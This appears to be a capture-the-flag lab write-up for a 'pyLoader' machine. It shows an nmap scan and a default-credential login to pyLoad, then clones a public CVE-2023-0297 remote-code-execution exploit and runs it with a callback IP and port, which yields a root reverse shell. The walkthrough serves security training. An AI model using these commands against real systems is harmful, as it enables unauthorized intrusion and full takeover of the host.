---
icon: ubuntu
---

# pyLoader - Intermediate

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```
# Nmap TCP
nmap -A -T4 -p- -Pn 192.168.224.26 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-04 11:21 EDT
Nmap scan report for 192.168.224.26
Host is up (0.030s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b9:bc:8f:01:3f:85:5d:f9:5c:d9:fb:b6:15:a0:1e:74 (ECDSA)
|_  256 53:d9:7f:3d:22:8a:fd:57:98:fe:6b:1a:4c:ac:79:67 (ED25519)
9666/tcp open  http    CherryPy wsgiserver
| http-title: Login - pyLoad 
|_Requested resource was /login?next=http://192.168.224.26:9666/
|_http-server-header: Cheroot/8.6.0
| http-robots.txt: 1 disallowed entry 
|_/
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5
OS details: Linux 5.0 - 5.14
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1025/tcp)
HOP RTT      ADDRESS
1   32.15 ms 192.168.45.1
2   32.10 ms 192.168.45.254
3   32.19 ms 192.168.251.1
4   32.23 ms 192.168.224.26
```

### <mark style="color:$primary;">HTTP Port 9666 TCP</mark>

<figure><img src="../../.gitbook/assets/image (2370).png" alt=""><figcaption></figcaption></figure>

I found default credentials for py Load on this [**Github**](https://github.com/pyload/pyload)

<figure><img src="../../.gitbook/assets/image (2371).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2372).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2374).png" alt=""><figcaption></figcaption></figure>

The info page reveals a version

A quick google takes us to this [**github**](https://github.com/JacobEbben/CVE-2023-0297/tree/main) repo revealing an rce exploit

### <mark style="color:$primary;">PyLoader 0.5.0 RCE</mark>

```
git clone https://github.com/JacobEbben/CVE-2023-0297.git
```

```
python exploit.py -t http://192.168.224.26:9666 -I 192.168.45.158 -P 9666
```

<figure><img src="../../.gitbook/assets/image (2373).png" alt=""><figcaption></figcaption></figure>

And we got a shell as the root user!
